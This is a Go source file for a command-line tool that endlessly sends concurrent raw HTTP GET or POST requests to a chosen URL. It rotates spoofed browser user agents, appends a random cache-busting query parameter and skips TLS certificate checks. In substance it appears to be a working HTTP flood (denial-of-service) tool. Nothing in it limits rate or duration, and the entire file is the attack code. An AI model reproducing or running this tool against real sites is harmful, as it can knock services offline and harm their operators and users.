package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type ConcurrentCounter struct {
	count int
	mutex sync.RWMutex
}

var userAgents = []string {
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0",
	"Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0",
	"Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0",
	"Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0",
	"Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0",
}
func main() {
	var httpMethod = flag.String("httpMethod", "GET", "HTTP Method: GET or POST")
	var rawurl = flag.String("url", "", "URL")
	var postData = flag.String("postData", "", "POST data")
	var maxConcurrentRequestCount = flag.Int("concurrent", 10, "Concurent request count")

	flag.Parse()

	log.SetOutput(os.Stderr)

	u, err := url.Parse(*rawurl)

	if err != nil {
		log.Fatalln(err)
	}

	var currentConcurrentRequestCounter = ConcurrentCounter{count: 0}
	concurrentRequestCountChannel := make(chan int)
	go listenRequestSent(&currentConcurrentRequestCounter, concurrentRequestCountChannel)

	for {
		if currentConcurrentRequestCounter.count == *maxConcurrentRequestCount {
			time.Sleep(50 * time.Millisecond)
			continue
		}

		currentConcurrentRequestCounter.mutex.Lock()
		currentConcurrentRequestCounter.count = currentConcurrentRequestCounter.count + 1
		currentConcurrentRequestCounter.mutex.Unlock()

		go fetch(
			*httpMethod,
			u,
			postData,
			concurrentRequestCountChannel,
		)
	}
}

func listenRequestSent(
	currentConcurrentRequestCounter *ConcurrentCounter,
	concurrentRequestCountChannel chan int,
) {
	for {
		<-concurrentRequestCountChannel

		currentConcurrentRequestCounter.mutex.Lock()
		currentConcurrentRequestCounter.count = currentConcurrentRequestCounter.count - 1
		currentConcurrentRequestCounter.mutex.Unlock()
	}
}

func buildConnection(scheme string, host string, port string) (net.Conn, error) {
	var dialer = net.Dialer{Timeout: 60 * time.Second}
	conn, err := dialer.Dial("tcp", host + ":" + port)
	if err != nil {
		log.Println("Connect error: ", err)
		return nil, err
	}

	if scheme == "https" {
		tlsConfig := tls.Config{
			InsecureSkipVerify: true,
		}
		tlsClient := tls.Client(conn, &tlsConfig)
		err = tlsClient.Handshake()
		if err != nil {
			log.Println("TLS Handshake error: ", err)
			return nil, err
		}

		return tlsClient, nil
	} else {
		return conn, nil
	}
}

func fetch(
	httpMethod string,
	u *url.URL,
	postData *string,
	concurrentRequestCountChannel chan int,
) error {
	var port = u.Port()
	if port == "" {
		switch u.Scheme {
		case "http":
			port = "80"
		case "https":
			port = "443"
		default:
			return errors.New("Unsupported schema")
		}
	}

	var requestUri = u.RequestURI()
	if u.RawQuery != "" {
		requestUri = fmt.Sprintf("%s&rand=%d", requestUri, rand.Intn(10))
	} else {
		requestUri = fmt.Sprintf("%s?rand=%d", requestUri, rand.Intn(10))
	}

	// choose random user agent
	var userAgent = userAgents[rand.Intn(len(userAgents))]

	// build headers
	var headers = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: close\n"

	headers = headers + "User-agent: " + userAgent + "\n"

	if httpMethod == "POST" && postData != nil && *postData != "" {
		headers = fmt.Sprintf("%sContent-Length: %d\n", headers, len(*postData))
		headers = headers + "Content-type: application/x-www-form-urlencoded\n"
	}

	// build payload
	var payload = ""
	if httpMethod == "POST" && postData != nil && *postData != ""  {
		payload = "\n" + *postData + "\n"
	}

	request := fmt.Sprintf(
		"%s %s HTTP/1.0\nHost: %s\n%s%s\n",
		httpMethod,
		requestUri,
		u.Hostname(),
		headers,
		payload,
	)

	var conn, err = buildConnection(u.Scheme, u.Hostname(), port)

	if err != nil {
		log.Println("Connection error: ", err)
		return err
	}

	defer conn.Close()

	_, err = conn.Write([]byte(request))
	if err != nil {
		log.Println("Error sending request: ", err)
		return err
	}

	concurrentRequestCountChannel <- 1

	var reader = bufio.NewReader(conn)
	response, err := reader.ReadString('\n')

	if err != nil {
		log.Println("Error reading response: ", err)
	} else {
		log.Println("Response: ", strings.TrimSpace(string(response)))
	}

	return nil
}